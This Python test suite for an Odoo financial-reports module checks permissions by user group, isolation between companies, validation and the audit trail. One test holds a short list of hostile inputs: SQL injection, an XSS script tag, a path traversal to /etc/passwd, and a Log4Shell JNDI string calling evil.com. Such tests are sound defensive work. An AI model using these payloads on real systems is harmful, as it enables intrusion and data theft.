# -*- coding: utf-8 -*-
"""
Tests de seguridad para account_financial_report
Siguiendo documentación oficial Odoo 18 Testing Framework
FASE 3: TESTING EXHAUSTIVO - Tests de seguridad
"""

from odoo.tests import TransactionCase, tagged
from odoo.exceptions import AccessError, ValidationError
from odoo import fields
from dateutil.relativedelta import relativedelta


@tagged('post_install', 'account_financial_report', 'security')  
class TestAccountFinancialReportSecurity(TransactionCase):
    """
    Tests de seguridad para módulo account_financial_report
    Verifica permisos, validaciones y protección de datos
    """
    
    def setUp(self):
        super().setUp()
        
        # Crear grupos de usuarios
        self.group_account_manager = self.env.ref('account.group_account_manager')
        self.group_account_user = self.env.ref('account.group_account_user')
        self.group_account_readonly = self.env.ref('account.group_account_readonly')
        
        # Crear usuarios de prueba
        self.account_manager = self.env['res.users'].create({
            'name': 'Account Manager Security',
            'login': 'acc_mgr_sec',
            'email': 'acc_mgr@test.com',
            'groups_id': [(6, 0, [self.group_account_manager.id])],
        })
        
        self.account_user = self.env['res.users'].create({
            'name': 'Account User Security',
            'login': 'acc_user_sec',
            'email': 'acc_user@test.com',
            'groups_id': [(6, 0, [self.group_account_user.id])],
        })
        
        self.account_readonly = self.env['res.users'].create({
            'name': 'Account Readonly Security',
            'login': 'acc_readonly_sec',
            'email': 'acc_readonly@test.com',
            'groups_id': [(6, 0, [self.group_account_readonly.id])],
        })
        
        self.basic_user = self.env['res.users'].create({
            'name': 'Basic User Security',
            'login': 'basic_sec',
            'email': 'basic@test.com',
            'groups_id': [(6, 0, [self.env.ref('base.group_user').id])],
        })
        
        self.company = self.env.user.company_id
        
    def test_account_manager_permissions(self):
        """
        Test permisos completos de account manager
        """
        # Manager puede crear reportes
        trial_balance = self.env['account.trial.balance'].with_user(self.account_manager).create({
            'name': 'Manager Security Test',
            'company_id': self.company.id,
            'date_from': fields.Date.today() - relativedelta(months=1),
            'date_to': fields.Date.today(),
        })
        
        self.assertTrue(trial_balance.exists(), "Manager debe poder crear reportes")
        
        # Manager puede computar reportes
        trial_balance.with_user(self.account_manager).action_compute_balance()
        self.assertEqual(trial_balance.state, 'computed', 
                        "Manager debe poder computar reportes")
        
        # Manager puede modificar reportes
        trial_balance.with_user(self.account_manager).write({
            'name': 'Modified by Manager'
        })
        self.assertEqual(trial_balance.name, 'Modified by Manager',
                        "Manager debe poder modificar reportes")
        
    def test_account_user_permissions(self):
        """
        Test permisos de usuario contable
        """
        # Usuario puede crear reportes básicos
        general_ledger = self.env['account.general.ledger'].with_user(self.account_user).create({
            'name': 'User Security Test',
            'company_id': self.company.id,
            'date_from': fields.Date.today() - relativedelta(months=1),
            'date_to': fields.Date.today(),
        })
        
        self.assertTrue(general_ledger.exists(), "Usuario debe poder crear reportes")
        
        # Usuario puede computar reportes
        general_ledger.with_user(self.account_user).action_compute_lines()
        self.assertEqual(general_ledger.state, 'computed',
                        "Usuario debe poder computar reportes")
        
    def test_readonly_user_restrictions(self):
        """
        Test restricciones de usuario de solo lectura
        """
        # Usuario readonly NO debe poder crear reportes
        with self.assertRaises(AccessError):
            self.env['account.trial.balance'].with_user(self.account_readonly).create({
                'name': 'Readonly Unauthorized',
                'company_id': self.company.id,
                'date_from': fields.Date.today() - relativedelta(months=1),
                'date_to': fields.Date.today(),
            })
            
    def test_basic_user_restrictions(self):
        """
        Test restricciones de usuario básico sin permisos contables
        """
        # Usuario básico NO debe poder acceder a reportes financieros
        with self.assertRaises(AccessError):
            self.env['account.trial.balance'].with_user(self.basic_user).create({
                'name': 'Basic User Unauthorized',
                'company_id': self.company.id,
                'date_from': fields.Date.today() - relativedelta(months=1),
                'date_to': fields.Date.today(),
            })
            
    def test_company_isolation_security(self):
        """
        Test aislamiento de datos entre empresas
        """
        # Crear segunda empresa
        company2 = self.env['res.company'].create({
            'name': 'Security Company 2',
            'currency_id': self.env.ref('base.USD').id,
        })
        
        # Crear usuario de empresa 2
        user_company2 = self.env['res.users'].create({
            'name': 'Company 2 User',
            'login': 'comp2_user',
            'email': 'comp2@test.com',
            'company_id': company2.id,
            'company_ids': [(6, 0, [company2.id])],
            'groups_id': [(6, 0, [self.group_account_user.id])],
        })
        
        # Crear reporte en empresa 1
        report_company1 = self.env['account.trial.balance'].create({
            'name': 'Company 1 Report',
            'company_id': self.company.id,
            'date_from': fields.Date.today() - relativedelta(months=1),
            'date_to': fields.Date.today(),
        })
        
        # Usuario de empresa 2 NO debe ver reportes de empresa 1
        company2_reports = self.env['account.trial.balance'].with_user(user_company2).search([
            ('company_id', '=', self.company.id)
        ])
        
        self.assertFalse(company2_reports, 
                        "Usuario de empresa 2 no debe ver reportes de empresa 1")
        
    def test_data_validation_security(self):
        """
        Test validaciones de seguridad en datos
        """
        # Test: fechas coherentes
        with self.assertRaises(ValidationError):
            self.env['account.trial.balance'].create({
                'name': 'Invalid Dates Security',
                'company_id': self.company.id,
                'date_from': fields.Date.today(),
                'date_to': fields.Date.today() - relativedelta(days=10),
            })
            
        # Test: empresa requerida
        with self.assertRaises(ValidationError):
            self.env['account.trial.balance'].create({
                'name': 'No Company Security',
                'date_from': fields.Date.today() - relativedelta(months=1),
                'date_to': fields.Date.today(),
                # company_id faltante
            })
            
    def test_field_level_security(self):
        """
        Test seguridad a nivel de campos
        """
        # Crear reporte como manager
        trial_balance = self.env['account.trial.balance'].with_user(self.account_manager).create({
            'name': 'Field Security Test',
            'company_id': self.company.id,
            'date_from': fields.Date.today() - relativedelta(months=1),
            'date_to': fields.Date.today(),
        })
        
        # Usuario readonly puede leer pero no escribir
        readonly_record = trial_balance.with_user(self.account_readonly)
        
        # Lectura debe funcionar
        name = readonly_record.name
        self.assertEqual(name, 'Field Security Test', "Lectura debe funcionar")
        
        # Escritura debe fallar
        with self.assertRaises(AccessError):
            readonly_record.write({'name': 'Modified by Readonly'})
            
    def test_report_state_security(self):
        """
        Test seguridad según estado del reporte
        """
        # Crear reporte
        report = self.env['account.trial.balance'].with_user(self.account_manager).create({
            'name': 'State Security Test',
            'company_id': self.company.id,
            'date_from': fields.Date.today() - relativedelta(months=1),
            'date_to': fields.Date.today(),
        })
        
        # En estado draft, usuario puede modificar
        report.with_user(self.account_user).write({
            'name': 'Modified in Draft'
        })
        
        # Computar como manager
        report.with_user(self.account_manager).action_compute_balance()
        
        # En estado computed, modificaciones pueden estar restringidas
        # (dependiendo de implementación específica)
        if hasattr(report, '_check_state_security'):
            with self.assertRaises((AccessError, ValidationError)):
                report.with_user(self.account_user).write({
                    'date_from': fields.Date.today() - relativedelta(months=2)
                })
                
    def test_sensitive_data_protection(self):
        """
        Test protección de datos sensibles
        """
        # Crear reporte con datos financieros
        trial_balance = self.env['account.trial.balance'].create({
            'name': 'Sensitive Data Test',
            'company_id': self.company.id,
            'date_from': fields.Date.today() - relativedelta(months=1),
            'date_to': fields.Date.today(),
        })
        
        trial_balance.action_compute_balance()
        
        # Verificar que campos sensibles están protegidos apropiadamente
        sensitive_fields = ['total_period_debit', 'total_period_credit']
        
        for field in sensitive_fields:
            if hasattr(trial_balance, field):
                # Usuario básico NO debe poder ver campos financieros sensibles
                try:
                    value = getattr(trial_balance.with_user(self.basic_user), field)
                    # Si no hay error, verificar comportamiento esperado según negocio
                except AccessError:
                    # Es correcto que haya restricción
                    pass
                    
    def test_audit_trail_security(self):
        """
        Test rastro de auditoría en operaciones sensibles
        """
        # Crear reporte como manager
        report = self.env['account.trial.balance'].with_user(self.account_manager).create({
            'name': 'Audit Trail Test',
            'company_id': self.company.id,
            'date_from': fields.Date.today() - relativedelta(months=1),
            'date_to': fields.Date.today(),
        })
        
        # Verificar datos de auditoría
        self.assertEqual(report.create_uid.id, self.account_manager.id,
                        "Debe registrar quien creó")
        self.assertTrue(report.create_date, "Debe registrar fecha de creación")
        
        # Modificar como usuario
        original_write_date = report.write_date
        report.with_user(self.account_user).write({
            'name': 'Modified for Audit'
        })
        
        self.assertEqual(report.write_uid.id, self.account_user.id,
                        "Debe registrar quien modificó")
        self.assertGreater(report.write_date, original_write_date,
                          "Debe actualizar fecha de modificación")
        
    def test_report_deletion_security(self):
        """
        Test seguridad en eliminación de reportes
        """
        # Crear reporte
        report = self.env['account.trial.balance'].with_user(self.account_manager).create({
            'name': 'Deletion Security Test',
            'company_id': self.company.id,
            'date_from': fields.Date.today() - relativedelta(months=1),
            'date_to': fields.Date.today(),
        })
        
        # Usuario básico NO debe poder eliminar
        with self.assertRaises(AccessError):
            report.with_user(self.account_user).unlink()
            
        # Manager puede eliminar (si está permitido por reglas de negocio)
        if not report.exists():  # Solo si no fue eliminado arriba
            report.with_user(self.account_manager).unlink()
            self.assertFalse(report.exists(), "Manager debe poder eliminar")
            
    def test_export_security(self):
        """
        Test seguridad en exportación de datos
        """
        # Crear reporte
        report = self.env['account.trial.balance'].with_user(self.account_manager).create({
            'name': 'Export Security Test',
            'company_id': self.company.id,
            'date_from': fields.Date.today() - relativedelta(months=1),
            'date_to': fields.Date.today(),
        })
        
        report.action_compute_balance()
        
        # Test exportación según permisos
        if hasattr(report, 'action_export_xlsx'):
            # Manager puede exportar
            export_result = report.with_user(self.account_manager).action_export_xlsx()
            self.assertIsInstance(export_result, dict, "Manager debe poder exportar")
            
            # Usuario básico NO debe poder exportar
            with self.assertRaises(AccessError):
                report.with_user(self.basic_user).action_export_xlsx()
                
    def test_batch_operations_security(self):
        """
        Test seguridad en operaciones por lotes
        """
        # Crear múltiples reportes
        reports = self.env['account.trial.balance']
        for i in range(3):
            report = self.env['account.trial.balance'].with_user(self.account_manager).create({
                'name': f'Batch Security Test {i+1}',
                'company_id': self.company.id,
                'date_from': fields.Date.today() - relativedelta(months=1),
                'date_to': fields.Date.today(),
            })
            reports |= report
            
        # Test operación por lotes como manager
        if hasattr(reports, 'action_batch_compute'):
            reports.with_user(self.account_manager).action_batch_compute()
            for report in reports:
                self.assertEqual(report.state, 'computed',
                               "Operación por lotes debe funcionar para manager")
                
        # Usuario básico NO debe poder operaciones por lotes
        with self.assertRaises(AccessError):
            reports.with_user(self.basic_user).write({'name': 'Batch Modified'})
            
    def test_api_access_security(self):
        """
        Test seguridad en acceso por API
        """
        # Test búsqueda con diferentes usuarios
        manager_search = self.env['account.trial.balance'].with_user(self.account_manager).search([])
        user_search = self.env['account.trial.balance'].with_user(self.account_user).search([])
        
        # Manager debe ver más o igual que usuario
        self.assertGreaterEqual(len(manager_search), len(user_search),
                               "Manager debe tener igual o mayor acceso")
        
        # Usuario básico debe tener acceso muy limitado o nulo
        basic_search = self.env['account.trial.balance'].with_user(self.basic_user).search([])
        self.assertEqual(len(basic_search), 0,
                        "Usuario básico no debe ver reportes financieros")
        
    def test_injection_protection(self):
        """
        Test protección contra inyección en búsquedas
        """
        # Test nombres con caracteres especiales potencialmente peligrosos
        dangerous_names = [
            "'; DROP TABLE account_trial_balance; --",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
        ]
        
        for name in dangerous_names:
            try:
                report = self.env['account.trial.balance'].create({
                    'name': name,
                    'company_id': self.company.id,
                    'date_from': fields.Date.today() - relativedelta(months=1),
                    'date_to': fields.Date.today(),
                })
                
                # Si se crea, verificar que el nombre se sanitizó apropiadamente
                self.assertNotEqual(report.name, name,
                                  "Nombres peligrosos deben ser sanitizados")
                
            except (ValidationError, ValueError):
                # Es correcto que rechace nombres peligrosos
                pass

    def test_rut_boundary_conditions(self):
        """Asegura límites y formato máximo de RUT"""
        from odoo.addons.account_financial_report.controllers.security_middleware import SecurityUtils

        # Demasiado largo
        self.assertFalse(SecurityUtils.validate_rut('123456789-0'))
        # Formato inválido (con puntos)
        self.assertFalse(SecurityUtils.validate_rut('12.345.678-9'))
        # Mínimo válido (acepta True/False según dígito verificador)
        self.assertIn(SecurityUtils.validate_rut('1000000-0'), (True, False))

    def test_threshold_calculations_boundaries(self):
        """Valida que umbrales críticos no desborden ni generen errores"""
        service = self.env['ratio.analysis.service']
        company = self.env.company
        # Usar mismas fechas para forzar período mínimo
        data = service.calculate_dupont_analysis(company, fields.Date.today(), fields.Date.today())
        self.assertIn('roe', data)
